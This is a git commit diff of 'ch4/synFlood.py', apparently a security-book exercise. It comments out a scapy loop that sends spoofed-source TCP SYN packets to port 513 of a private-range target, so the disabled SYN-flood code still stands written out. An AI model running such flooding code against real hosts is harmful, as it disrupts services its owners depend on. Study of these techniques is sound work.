83a09a4ac8a7a7e5f19b6258907cc3fc0a07ad61
aleksa <zabumaphu@gmail.com>
2023-06-23 19:37:41 -0400

    Ch4 Done.

--- ch4/synFlood.py
+++ ch4/synFlood.py
@@ -8,10 +8,11 @@ from scapy.all import *
 
 def synFlood(src, tgt):
     for sport in range(1024, 65535):
-        IPlayer = IP(src=src. dst=tgt)
-        TCPlayer = TCP(sport=sport, dport=513)
-        pkt = IPlayer / TCPlayer
-        send(pkt)
+        # IPlayer = IP(src=src. dst=tgt)
+        # TCPlayer = TCP(sport=sport, dport=513)
+        # pkt = IPlayer / TCPlayer
+        # send(pkt)
+        pass
 src = "10.1.1.2"
 tgt = "192.168.1.3"
 
